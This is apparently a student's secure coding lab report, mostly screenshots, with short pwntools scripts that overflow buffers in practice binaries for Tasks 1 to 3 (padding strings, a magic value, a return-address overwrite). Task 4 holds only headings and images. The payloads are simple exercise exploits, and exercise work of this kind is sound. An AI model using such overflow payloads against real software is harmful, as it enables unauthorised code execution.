Colby Crutcher

Secure Coding

Lab 5

### Task 1

- Endianness: 

![](image-1.png)


- Checksec:

![](image-2.png)

Code to overflow:

```c
from pwn import *

# Start program
io = process('./task1')
#io = remote('10.202.12.82', 11111)

# Send string to overflow buffer
io.sendlineafter(b':', b'AAAAAAAAAAAA\0')

# Receive output
print(io.recvall().decode())

```

![Output for overflow Task 1](image.png)



### Task 2

- Endianness

![](image-4.png)


- checksec

![](image-6.png)

```c
io.sendlineafter(b':', b'A' * 25 + b'\x11\xfa\xad\xde')
```

![Successful Overflow](image-3.png)



### Task 3

- Endianness

![](image-5.png)

- Checksec

![](image-7.png)

```c
io.sendlineafter(b':', b'A' * 32 + b'\xc6\x91\x04\x08')
```

![Successful Overflow](image-8.png)


### Task 4

- Endianness

![](image-9.png)

- checksec

![](image-10.png)

